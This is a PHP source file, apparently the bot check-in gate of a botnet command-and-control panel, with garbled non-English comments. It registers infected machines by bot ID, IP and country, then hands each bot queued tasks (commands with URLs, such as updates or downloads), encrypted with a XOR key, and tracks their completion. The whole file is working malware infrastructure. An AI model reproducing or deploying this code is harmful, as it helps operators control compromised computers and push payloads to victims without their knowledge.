<?php

require("config.php");
require("includes/functions.php");
require("includes/mysql.php");
require("includes/geoip.php");
$db = new odbcClass();

// ���� ���� ��� � ������������� ����
if(isset($_GET["bid"]) && isset($_GET["os"]))
{
	$bid = $_GET["bid"];
	$os = get_os($_GET['os']);

	// ���������� �� ������ �������������� ����
	if(preg_match("/^[[:xdigit:]]{16}$/", $bid))
	{
		// ������� ������ �� IP. � IP ��������� �� ����������.
		$ip = getip();
		$cc = get_country($ip);
		
		// ��������� � ���� ������������� ����, ���� ����� ��� ���� �� �������� ����� ���������� ������
		$db -> query("INSERT INTO `bots` (`id`,`ip`,`cc`,`first_time`,`last_time`,`system`) VALUES ('".$bid."','".$ip."','".$cc."','".time()."','".time()."','".$os."') ON DUPLICATE KEY UPDATE `last_time` = '".time()."';");

		// ������ � ��������
		// �������� ������ + ������ �� ������� ����� ����������� � ������ + �������� � �������� ��� id ���� � ������� ������� ���� ��� � ���������� � � ������ ����� ���� ������ ������� ������������� �����, � ��� �� � ������ �������������� ��� ���� ������
		$task = $db -> query("SELECT * FROM tasks
LEFT JOIN ccTaskFilter ON ccTaskFilter.taskId = tasks.id 
WHERE tasks.bot = '".$bid."' 
AND (tasks.count < tasks.`limit` OR tasks.`limit` = 0)
AND (ccTaskFilter.cc = '".$cc."' OR ccTaskFilter.cc='all') 
AND '".$bid."' NOT IN (SELECT botId FROM finished WHERE finished.taskId = tasks.id)
AND (tasks.stop = '0' OR tasks.stop = '-1')");
		
		if ($task[0] == 0) {
			// �������� ������ + ������ �� ������� ����� ����������� � ������ + �������� � �������� ��� id ���� � ������� ������� ��� ���� � � ������ ����� ���� ������ ������� ������������� �����, � ��� �� � ������ �������������� ��� ���� ������
			$task=$db->query("SELECT * FROM tasks
LEFT JOIN ccTaskFilter ON ccTaskFilter.taskId = tasks.id 
WHERE tasks.bot = 'all' 
AND (tasks.count < tasks.`limit` OR tasks.`limit` = 0)
AND (ccTaskFilter.cc = '".$cc."' OR ccTaskFilter.cc='all') 
AND '".$bid."' NOT IN (SELECT botId FROM finished WHERE finished.taskId = tasks.id)
AND (tasks.stop = '0' OR tasks.stop = '-1')");
			}

		
		$task[0]==0 ? exit(SECRET_KEY) : false;
		
		
		// ��������� ����� �������
		$taskOut='';
		foreach($task as $k=>$v) {
			$v['flags']=trim($v['flags']);
			if (!empty($v['flags'])) {
				$v['flags']=str_split($v['flags']);
				$v['flags']=' -'.implode(' -',$v['flags']);
			}
			// ������ �� 2 �������� 2011�.
			if ($v['command']=='update') $v['flags']='';
			$taskOut.=$v['command'].$v['flags'].' '.$v['url'].' '.$v['functionName']."\r\n";
			// ������ ������ � ����������� ��� ����� ����
			$db->query("INSERT INTO `finished` (`botId`, `taskId`) VALUES ('".$bid."', '".$v['id']."');");
			// �������� ������� �� ���� �������� ���� ������� ������� �� ������ ��������
			$db->query("UPDATE `tasks` SET  `count` =  '".intval($v['count']+1)."' WHERE `id` ='".$v['id']."'");
		}
		
		//echo trim($taskOut,"\r\n");
		$xorkey = generate_key(10);
		exit($xorkey . encrypt($taskOut, $xorkey));
	}
}